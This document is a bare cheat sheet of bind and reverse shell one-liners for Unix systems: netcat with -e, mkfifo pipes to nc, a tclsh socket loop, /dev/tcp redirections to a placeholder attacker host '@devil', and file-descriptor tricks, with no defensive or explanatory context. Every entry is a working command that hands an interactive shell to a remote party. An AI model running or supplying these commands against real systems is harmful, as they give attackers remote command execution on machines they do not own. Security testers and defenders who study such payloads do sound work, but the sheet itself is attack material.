## BIND ##
# nc (vulnerable) #
$ nc -lp 4242 -e /bin/sh

# nc (all) #
$ rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -lp 4242 > /tmp/f

## REVERSE ##
# nc (vulnerable) #
$ nc @devil 4242 -e /bin/sh

# nc (all) #
$ rm -f /tmp/ff && mkfifo /tmp/ff && cat /tmp/ff | /bin/sh -i 2>&1 | nc @devil 4242 > /tmp/ff

# tclsh (on most unixes?) #
$ echo 'set s [socket 127.0.0.1 1234];while 1 { puts -nonewline $s "$ ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh

# /dev/tcp (requires two reverse connections, one in and one out) #
$ cat < /dev/tcp/@devil/4242 | /bin/sh -p -i &> /dev/tcp/@devil/4243

# You can seamlessly interact with both with, for instance, #
$ (nc -lv 4243 &); nc -lv 4242

## Toying with file descriptors (not very compatible...) #
# 1: (wtf)
$ 0<&196;exec 196<>/dev/tcp/@devil/4242; sh <&196 >&196 2>&196

# 2:
$ exec 5<>/dev/tcp/127.0.0.1/4242
$ while read line 0<&5; do $line 2>&5 >&5; done

